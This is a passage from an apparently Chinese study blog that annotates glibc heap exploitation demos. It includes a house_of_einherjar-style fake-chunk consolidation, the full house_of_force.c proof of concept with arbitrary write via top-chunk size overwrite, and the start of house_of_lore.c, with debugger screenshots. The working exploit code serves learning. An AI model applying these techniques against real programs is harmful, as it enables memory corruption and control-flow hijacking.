	fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// size of the chunk just needs to be small enough to stay in the small bin</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">// fwd</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">// bck</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">//fwd_nextsize</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">//bck_nextsize</span>


	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk at %p looks like:\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prev_size (not used): %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fwd: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bck: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fwd_nextsize: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bck_nextsize: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */</span>
	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_b_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe allocate 0xf8 bytes for 'b'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//将chunk b的size放入b_size_ptr中</span>
	<span class="token comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nb.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0x100) | prev_inuse = 0x101\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    <span class="token comment">//==》real_a_size+1个字节的位置等于0</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is easiest if b.size is a multiple of 0x100 so you "</span>
		   <span class="token string">"don't change the size of b, only its prev_inuse bit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If it had been modified, we would need a fake chunk inside "</span>
		   <span class="token string">"b where it will try to consolidate the next chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Write a fake prev_size to the end of a</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span>
		   <span class="token string">"it will consolidate with our fake chunk\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> fake_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake prev_size will be %p - %p = %#lx\n"</span><span class="token punctuation">,</span> b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">,</span> fake_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>real_a_size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>

	<span class="token comment">//Change the fake chunk's size to reflect b's new prev_size</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>

	<span class="token comment">// free b and it will consolidate with our fake chunk</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//if we allocate another chunk before we free b we will need to </span>
	<span class="token comment">//do two things: </span>
	<span class="token comment">//1) We will need to adjust the size of our fake chunk so that</span>
	<span class="token comment">//fake_chunk + fake_chunk's size points to an area we control</span>
	<span class="token comment">//2) we will need to write the size of our fake chunk</span>
	<span class="token comment">//at the location we control. </span>
	<span class="token comment">//After doing these two things, when unlink gets called, our fake chunk will</span>
	<span class="token comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span>
	<span class="token comment">//otherwise we need to make sure that our fake chunk is up against the</span>
	<span class="token comment">//wilderness</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Next malloc(0x200) is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>创建一个chunk a：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527164422322.png"></p>
<p>定义一个fake_chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527164717857.png"></p>
<p>创建一个chunk b：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527164802430.png"></p>
<p>此时的堆空间：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527164909793.png"></p>
<p>通过72行将chunk b的inuse位修改为0：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527165210363.png"></p>
<p><strong>重点：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> fake_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>b-sizeof(size_t)*2：chunk b的malloc指针减去两个地址位宽&#x3D;&#x3D;》为chunk b的头指针</p>
<p>(uint8_t*)fake_chunk：fake_chunk的头指针</p>
<p>&#x3D;&#x3D;》得fake_size为chunk b头指针到fake_chunk头指针得偏移</p>
<p>通过84行在chunk a的最后写入fake_size</p>
<p>该位置为chunk b的prev_size位</p>
<p>&#x3D;&#x3D;》该值实际上是一个负数</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527203731900.png"></p>
<p>将fakechunk的size修改为fakesize后</p>
<p>释放chunk b：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527204145734.png"></p>
<p>部署：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527210951610.png"></p>
<p>在释放chunk b后，实现向后合并&#x3D;&#x3D;》</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527211036829.png"></p>
<p><strong>释放合并检查：</strong></p>
<p>chunk b被释放，首先检查inuse&#x3D;&#x3D;》为0&#x3D;&#x3D;》存在一个相邻地址的堆块处于free状态&#x3D;&#x3D;》</p>
<p>根据chunk b的prev_size往前寻找是否存在一个fake_size大小的chunk&#x3D;&#x3D;&#x3D;》寻找到fake_chunk</p>
<p>而且fake_chunk的size正是fake_size&#x3D;&#x3D;》</p>
<p>需要绕过unlink检查&#x3D;&#x3D;》所以部署了fd，bk，fd_nextsize,bk_nextsize&#x3D;&#x3D;&#x3D;》</p>
<p>最终实现chunk b与fake_chunk合并为一个size为fake_size+b_size大小的chunk</p>
<p><strong>重点：</strong>在合并后，由于chunk b与top chunk相邻&#x3D;&#x3D;》将继续与top chunk 合并</p>
<p>最后申请一个0x200的堆块&#x3D;&#x3D;》bin中为空，top chunk划出chunk d&#x3D;&#x3D;》</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527211833164.png"></p>
<p><strong>最终实现控制任意地址</strong></p>
<h3 id="house-of-force-c"><a href="#house-of-force-c" class="headerlink" title="house_of_force.c"></a>house_of_force.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04

*/</span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">char</span> bss_var<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is a string that we want to overwrite."</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Force\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The top chunk is a special chunk. Is the last in memory "</span>
		<span class="token string">"and is the chunk that will be resized when malloc asks for more space from the os.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the end, we will use this to overwrite a variable at %p.\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Its current value is: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>



	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's allocate the first chunk, taking space from the wilderness.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk of 256 bytes has been allocated at %p.\n"</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span><span class="token punctuation">,</span> real_size <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//----- VULNERABILITY ----</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>ptr_top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe top chunk starts at %p\n"</span><span class="token punctuation">,</span> ptr_top<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Old size of top chunk %#llx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"New size of top chunk %#llx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//------------------------</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"</span>
	   <span class="token string">"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"</span>
	   <span class="token string">"overflow) and will then be able to allocate a chunk right over the desired region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> evil_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>bss_var <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr_top<span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"</span>
	   <span class="token string">"we will malloc %#lx bytes.\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">,</span> ptr_top<span class="token punctuation">,</span> evil_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>new_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"As expected, the new pointer is at the same place as the old top chunk: %p\n"</span><span class="token punctuation">,</span> new_ptr <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span><span class="token operator">*</span> ctr_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow, the next chunk we overwrite will point at our target buffer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(100) => %p!\n"</span><span class="token punctuation">,</span> ctr_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can finally overwrite that value:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... old string: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strcpy</span><span class="token punctuation">(</span>ctr_chunk<span class="token punctuation">,</span> <span class="token string">"YEAH!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... new string: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>ctr_chunk <span class="token operator">==</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">// some further discussion:</span>
	<span class="token comment">//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");</span>
	<span class="token comment">//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "</span>
	<span class="token comment">//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");</span>
	<span class="token comment">//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");</span>
	<span class="token comment">//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");</span>
	<span class="token comment">//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"</span>
	<span class="token comment">//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");</span>

	<span class="token comment">//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);</span>
	<span class="token comment">//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);</span>

	<span class="token comment">//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先申请一个chunk p1</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527212520208.png"></p>
<p>定义了ptr_top指向top chunk的prev_size</p>
<p>将top chunk的size修改为-1</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528150048552.png"></p>
<p>接下来就可以利用该top chunk申请任意大小的chunk&#x3D;&#x3D;》</p>
<p><strong>实现任意地址写</strong></p>
<h3 id="house-of-lore-c"><a href="#house-of-lore-c" class="headerlink" title="house_of_lore.c"></a>house_of_lore.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    &#123;
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim))&#123;

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                &#125;

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Nice jump d00d\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>


